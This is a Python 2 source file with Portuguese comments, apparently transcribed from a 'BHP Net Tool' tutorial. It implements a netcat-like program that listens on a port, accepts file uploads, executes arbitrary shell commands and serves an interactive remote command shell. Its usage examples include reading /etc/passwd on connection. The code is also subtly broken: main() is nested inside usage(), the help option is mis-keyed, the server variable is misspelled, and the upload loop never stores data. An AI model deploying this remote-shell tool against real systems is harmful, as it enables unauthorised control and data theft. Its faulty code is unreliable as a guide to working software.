import sys
import socket
import getopt
import threading
import subprocess

#define algumas variáveis globais
listen             = False
command            = False
upload             = False
execute            = ""
target             = ""
upload_destination = ""
port               = 0

def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhpnet.py -t target_host -p port"
    print "-l --listen - listen on [host]:[port] for incoming connection"
    print "-e --execute=file_to_run - execute the given file upon ¬ receiving a connection"
    print "-c --command - initialize a command shell"
    print "-u --upload=destination - upon receiving connection upload a ¬ file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhpnet.py =t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)
    
    def main():
        global listen
        global port
        global execute
        global command
        global upload_destination
        global target
        
        if not len(sys.argv[1:]):
            usage()
            
        #lê as opções de linha de comando
        try:
            opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu:",
                                       ["help","listen","execute","target","port","command","upload"])
        except getopt.GetoptError as err:
            print str(err)
            usage()
            
        for o,a in opts:
            if o in ("-l","--help"):
                usage()
            elif o in ("-l","--listen"):
                listen = True
            elif o in ("-e","--execute"):
                execute = a
            elif o in ("-c","--command"):
                command = True
            elif o in ("-u","--upload"):
                upload_destination = a
            elif o in ("-t","--target"):
                target = a
            elif o in ("-p","--port"):
                port = int(a)
            else:
                assert False,"Unhandled Option"
            
            #iremos ouvir ou simplesmente enviar dados de stdin?
            if not listen and len(target) and port > 0:
                #Lê o buffer da linha de comando
                #isso causará um bloqueio, portanto envie um CTRL-D se não estiver
                #enviando dados de entrada para stdin
                buffer = sys.stdin.read()
                
                #send data off
                client_sender(buffer)
            
            #iremos ouvir a porta e, potencialmente,
            #faremos upload de dados, executaremos comandos e deixaremos um shell
            #de acordo com as opções de linha de comando anteriores
            if listen:
                server_loop()
main()

def client_sender(buffer):
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        #Conecta-se ao nosso host-alvo
        client.connect((target,port))
        
        if len(buffer):
            client.send(buffer)
        while True:
            
            #agora espera receber dados de volta
            recv_len = 1
            response = ""
            
            while recv_len:
                
                data = client.recv(4096)
                recv_len = len(data)
                response+= data
                
                if recv_len < 4096:
                    break
            print response,
            
            #espera mais dados de entrada
            buffer = raw_input("")
            buffer += "\n"
            
            #envia os dados
            client.send(buffer)
            
    except:
        print "[*] Exception! Exiting."
        
        #encerra a conexão
        client.close()
        
def server_loop():
    global target
    
    #se não houver nenhum alvo definido, ouviremos todas as interfaces
    
    if not len(target):
        target = "0.0.0.0"
        
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servet.bind((target,port))
    server.listen(5)
    
    while True:
        client_socket, addr = server.accept()
        
        #dispara um thread para cuidar de nosso novo cliente
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()
def run_command(command):
    
    #remove  a quebra de linha 
    command = command.rstrip()
    
    #executa o comando e obtém os dados de saída
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command. \r\n"
        
    #envia os dados de saída de volta ao cliente
    return output

def client_handler (client_socket):
    global upload
    global execute
    global command
    
    #verifica se é upload
    if len(upload_destination):
        #Lê todos os bytes e grava em nosso destino
        file_buffer = ""
        
        #permanece lendo os dados até que não haja mais nenhum disponível
        while True:
            data = client_socket.recv(1024)
            
            if not data:
                break
        else:
            file_buffer += data
            
        #Agora tentaremos gravar esses bytes
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            
            #confirma que gravamos o arquivo
            client_socket.send("Successfully saved file to"
                               "%s\r\n" % upload_destination)
            
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    if len(execute):
        
        #executa o comando
        output= run_command(execute)
        
        client_socket.send(output)
        
    #entra em um outro laço se um shell de comandos foi solicitado
    if command:
        
        while True:
            #mostra um prompt simples
            client_socket.send("<BHP:#> ")
            
            #Agora recebemos dados até vermos um linefeed (tecla enter)
            
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                
            #envia de volta a saída do comando
            response = run_command(cmd_buffer)
            
            #envia de volta a responta
            client_socket.send(response)
